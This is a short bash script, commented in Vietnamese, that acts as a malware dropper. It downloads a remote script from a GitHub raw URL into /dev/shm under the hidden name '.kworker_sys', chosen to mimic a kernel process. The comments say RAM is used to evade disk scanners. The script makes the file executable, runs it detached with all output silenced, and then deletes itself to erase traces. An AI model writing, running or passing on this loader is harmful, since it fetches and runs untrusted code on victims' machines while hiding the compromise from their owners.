#!/bin/bash

# 1. Tải file test.elf từ GitHub và lưu dưới tên ẩn trong RAM
# Dùng /dev/shm để né các trình quét ổ cứng
curl -sL https://raw.githubusercontent.com/AnnaliseHackett/Fix/refs/heads/main/back.sh -o /dev/shm/.kworker_sys

# 2. Cấp quyền thực thi
chmod +x /dev/shm/.kworker_sys

# 3. Chạy ngầm hoàn toàn và cắt đứt liên kết với terminal (tránh bị tắt khi thoát)
# Điều hướng mọi log vào /dev/null để không hiện thông báo lạ
nohup /dev/shm/.kworker_sys >/dev/null 2>&1 &

# 4. Tự xóa file script cài đặt để xóa dấu vết
rm -- "$0"

